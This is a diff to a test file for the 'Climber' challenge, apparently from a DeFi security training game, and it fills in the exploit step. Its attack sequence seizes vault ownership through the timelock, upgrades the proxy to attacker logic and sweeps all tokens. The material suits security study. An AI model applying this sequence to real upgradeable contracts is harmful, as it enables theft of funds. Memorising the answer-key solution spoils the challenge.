@@ -52,7 +52,18 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+        
+        // Change Vault owner to attacker
+        let exploitContract = await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy(attacker.address, this.timelock.address, this.vault.address);
+        await exploitContract.connect(attacker).exploit();
+
+        // Upgrade to attacker's Contract
+        this.climberAttackerLogic = await ethers.getContractFactory('ClimberAttackerLogic', attacker);
+        let attacker_vault = await upgrades.upgradeProxy(this.vault.address, this.climberAttackerLogic);
+
+        // Drain all tokens from vault
+        await attacker_vault.connect(attacker).sweepFunds(this.token.address);
+
     });
 
     after(async function () {
